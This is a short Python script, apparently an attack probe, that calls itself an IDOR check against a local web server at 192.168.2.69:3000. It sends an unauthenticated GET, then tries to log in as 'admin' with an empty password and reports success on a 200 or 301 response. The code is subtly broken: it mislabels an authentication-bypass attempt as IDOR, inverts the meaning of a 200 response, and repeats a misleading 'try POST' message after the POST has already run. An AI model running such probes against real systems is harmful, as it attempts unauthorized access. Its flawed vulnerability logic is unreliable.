import requests

def check_idor(target_url):
    print(f'Checking {target_url} for IDOR vulnerability...')
    try:
        # Send a GET request to the target endpoint without authentication
        response = requests.get(target_url, timeout=5)
        if response.status_code in [200, 301]:
            print('RESULT: NO_SIGNAL')
            return False
        else:
            print(f'Very weak indicator: {response.status_code} received.')
            print('Maybe the endpoint is vulnerable to IDOR? Let\'s try POST...')
    except requests.exceptions.RequestException:
        print('Connection error. Maybe it is not vulnerable or down.')
        return False

    # Try a POST request with a non-empty username and empty password
    payload = {'username': 'admin', 'password': ''}
    try:
        response = requests.post(target_url, json=payload, timeout=5)
        if response.status_code in [200, 301]:
            print('RESULT: SUCCESS')
            return True
        else:
            print(f'Very weak indicator: {response.status_code} received.')
            print('Maybe the endpoint is vulnerable to IDOR? Let\'s try POST...')
    except requests.exceptions.RequestException:
        print('Connection error. Maybe it is not vulnerable or down.')
        return False

check_idor('http://192.168.2.69:3000')